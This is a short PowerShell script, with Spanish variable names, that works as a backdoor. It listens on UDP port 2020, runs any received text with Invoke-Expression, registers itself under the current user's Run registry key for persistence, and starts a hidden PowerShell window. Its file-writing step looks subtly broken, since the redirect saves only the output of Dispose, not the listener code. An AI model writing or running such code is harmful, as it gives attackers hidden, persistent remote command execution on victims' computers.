$rutaScript = Join-Path $env:HOMEDRIVE "\Users\$env:USERNAME\script.ps1";$port = 2020;$endpoint = New-Object System.Net.IPEndPoint ([IPAddress]::Any, $port);$udpclient = New-Object System.Net.Sockets.UdpClient $port;$content = $udpclient.Receive([ref]$endpoint);[Text.Encoding]::ASCII.GetString($content) | iex;$udpclient.Dispose() > $rutaScript

$nombreEntrada = "MiScript"
$valorEntrada = "powershell.exe -File $rutaScript"
if (-not (Test-Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\$nombreEntrada")) {
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $nombreEntrada -Value $valorEntrada
}
Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -File $rutaScript" -NoNewWindow -PassThru


